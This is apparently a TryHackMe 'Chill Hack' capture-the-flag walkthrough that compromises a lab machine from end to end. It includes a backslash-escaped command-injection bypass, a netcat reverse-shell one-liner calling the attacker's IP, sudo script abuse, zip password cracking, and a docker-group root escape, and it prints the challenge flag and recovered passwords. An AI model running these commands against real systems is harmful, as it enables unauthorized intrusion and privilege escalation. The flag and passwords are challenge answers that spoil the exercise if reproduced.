`Tryhackme  Chill Hack`
--
By :- Unknownperson
-- 

## Open Port's 
--

Open 10.10.0.215:21
Open 10.10.0.215:22
Open 10.10.0.215:80


Nmap Scan :- 
--

PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to ::ffff:10.17.84.227
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 3
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_-rw-r--r--    1 1001     1001           90 Oct 03  2020 note.txt
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 09:f9:5d:b9:18:d0:b2:3a:82:2d:6e:76:8c:c2:01:44 (RSA)
|   256 1b:cf:3a:49:8b:1b:20:b0:2c:6a:a5:51:a8:8f:1e:62 (ECDSA)
|_  256 30:05:cc:52:c6:6f:65:04:86:0f:72:41:c8:a4:39:cf (ED25519)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-title: Game Info
|_http-server-header: Apache/2.4.29 (Ubuntu)
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel


## FTP have Anonymous login 
File get throw that is note.txt :- Anurodh told me that there is some filtering on strings being put in the command -- Apaar

User :- Anurodh , apaar
--

Than Doing the Directory Search throw dirb , gobuster
--

## Intresting Directory Get :- http://10.10.0.215/secret/
## where We can Inject Command's

we can filtering command in this way :- 
l\s -la
c\a\t


> so now we have to get revshell using this type of command

r\m /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc 10.17.84.227 5555 >/tmp/f
--

>  WOW We got our Firsh Shell

Currently we are www user let check sudo -l 
--

## sudo -l
Matching Defaults entries for www-data on ubuntu:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User www-data may run the following commands on ubuntu:
    (apaar : ALL) NOPASSWD: /home/apaar/.helpline.sh

> let's check helpline.sh file 
#!/bin/bash

echo
echo "Welcome to helpdesk. Feel free to talk to anyone at any time!"
echo

read -p "Enter the person whom you want to talk with: " person

read -p "Hello user! I am $person,  Please enter your message: " msg

$msg 2>/dev/null

> Like this will run the Command lets Take account of Apaar

sudo -u apaar /home/apaar/.helpline.sh
1st input :- jdsfdshf
2nd input :- /bin/bash
--

## At this way we have 1st user apaar

apaar@ubuntu:~$ cat loca	
cat local.txt 
{USER-FLAG: e8vpd3323cfvlp0qpxxx9qtr5iq37oww}

Now we Add our id_rsa.pub in apaar/.ssh/authorized_key
to get better shell

## Privillage Escalation

> There is file in :- root@4989422d1c1a:/var/www/files# ls
account.php  hacker.php  images  index.php  style.css

> in hacker.php there is image in /imges folder hacker-with-laptop_23-2147985341.jpg

> that sims priseous to us which give us output's
> we get throw python3 http.server 8888 hosting 
> than we get to know it is password Protected

Than we purforme this command's:- 

zip2john hacker-with-laptop_23-2147985341.jpg > hash
john hash --wordlist=/usr/share/wordlist/rockyou.txt
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
pass1word        (backup.zip/source_code.php)     
1g 0:00:00:00 DONE (2024-09-07 11:09) 2.083g/s 34133p/s 34133c/s 34133C/s toodles..christal
--

-> Now we ahve source.php
it contain password in base64 we convert it and we have password as :- 
!d0ntKn0wmYp@ssw0rd

Now we can login in anurdh  
--

## After we check id which is  :- uid=1002(anurodh) gid=1002(anurodh) groups=1002(anurodh),999(docker)

> So throw gtfo bins we run this command 

## docker run -v /:/mnt --rm -it alpine chroot /mnt bash
and we get Root Shell

## And We Creack it the Room

